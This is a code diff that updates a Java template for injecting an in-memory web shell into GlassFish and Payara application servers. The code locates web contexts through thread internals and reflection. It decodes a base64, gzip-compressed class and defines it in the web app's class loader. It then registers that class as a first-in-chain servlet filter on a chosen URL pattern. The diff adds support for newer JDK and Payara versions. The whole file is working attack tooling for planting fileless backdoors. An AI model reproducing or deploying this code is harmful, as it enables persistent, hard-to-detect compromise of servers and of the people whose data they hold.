@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.glassfish;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -13,15 +14,23 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author pen4uin, ReaJason
  */
 public class GlassFishFilterInjector {
-    
-    private static boolean ok;
 
-    private static String shellClassName;
-    private static String shellClass;
-    private static String urlPattern;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
 
     public GlassFishFilterInjector() {
         if (ok) {
@@ -31,26 +40,42 @@ public class GlassFishFilterInjector {
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-        
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
-                   
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                   
+                    msg += "[" + getUrlPattern() + "] ready\n";
                 } catch (Throwable e) {
-                   
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
+        System.out.println(msg);
     }
 
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
 
     /**
      * com.sun.enterprise.web.WebModule
@@ -61,14 +86,56 @@ public class GlassFishFilterInjector {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                Object target = getThreadTarget(thread);
+                if (target == null) {
+                    continue;
+                }
+                Object container = getContainerFromProcessor(target);
+                if (container == null) {
+                    continue;
+                }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(container, "children");
+                if (childrenMap == null) {
+                    continue;
+                }
                 for (Object value : childrenMap.values()) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    contexts.addAll(children.values());
+                    if (children != null) {
+                        contexts.addAll(children.values());
+                    }
                 }
             }
         }
         return contexts;
+    }
+
+    private Object getThreadTarget(Thread thread) throws Exception {
+        Object target = getFieldValue(thread, "target");
+        if (target == null) {
+            // JDK 21+
+            Object holder = getFieldValue(thread, "holder");
+            if (holder != null) {
+                target = getFieldValue(holder, "task");
+            }
+        }
+        return target;
+    }
+
+    /**
+     * Older GlassFish/Payara: ContainerBackgroundProcessor.this$0
+     * Payara 6.2024+/7: ContainerBackgroundProcessorAtomic.base (WeakReference)
+     */
+    private Object getContainerFromProcessor(Object target) throws Exception {
+        Object container = getFieldValue(target, "this$0");
+        if (container != null) {
+            return container;
+        }
+        Object atomic = getFieldValue(target, "containerBackgroundProcessorAtomic");
+        Object base = atomic != null ? getFieldValue(atomic, "base") : getFieldValue(target, "base");
+        if (base instanceof java.lang.ref.Reference) {
+            return ((java.lang.ref.Reference<?>) base).get();
+        }
+        return base;
     }
 
     private ClassLoader getWebAppClassLoader(Object context) throws Exception {
@@ -80,24 +147,25 @@ public class GlassFishFilterInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
-    
+    @SuppressWarnings("all")
     public void inject(Object context, Object shell) throws Exception {
-        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{shellClassName}) != null) {
+        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             return;
         }
         Object filterDef;
@@ -116,19 +184,19 @@ public class GlassFishFilterInjector {
             filterMap = filterMapClass.newInstance();
         }
 
-        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{shellClassName});
+        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
         try {
-            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{shellClassName});
+            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
         } catch (Exception e) {
             invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{shell.getClass()});
         }
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
-        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{shellClassName});
+        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
         try {
-            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{urlPattern});
+            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
         } catch (Exception e) {
             // tomcat v5
-            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{urlPattern});
+            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
         }
 
         // addFilterMapFirst
@@ -140,11 +208,15 @@ public class GlassFishFilterInjector {
         filterConfigConstructor.setAccessible(true);
         Object filterConfig = filterConfigConstructor.newInstance(context, filterDef);
         Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
-        filterConfigs.put(shellClassName, filterConfig);
+        filterConfigs.put(getClassName(), filterConfig);
     }
-    
 
-    
+    @Override
+    public String toString() {
+        return msg;
+    }
+
+    @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
         Class<?> decoderClass;
         try {
@@ -157,7 +229,7 @@ public class GlassFishFilterInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
@@ -177,7 +249,7 @@ public class GlassFishFilterInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
         Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
         Method method = null;
@@ -199,7 +271,7 @@ public class GlassFishFilterInjector {
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
-    
+    @SuppressWarnings("all")
     public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         for (Class<?> clazz = obj.getClass();
              clazz != Object.class;
@@ -214,7 +286,7 @@ public class GlassFishFilterInjector {
     }
 
 
-    
+    @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         try {
             Field field = getField(obj, name);
@@ -226,4 +298,25 @@ public class GlassFishFilterInjector {
     }
 
 
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        Field field = getField(obj, fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
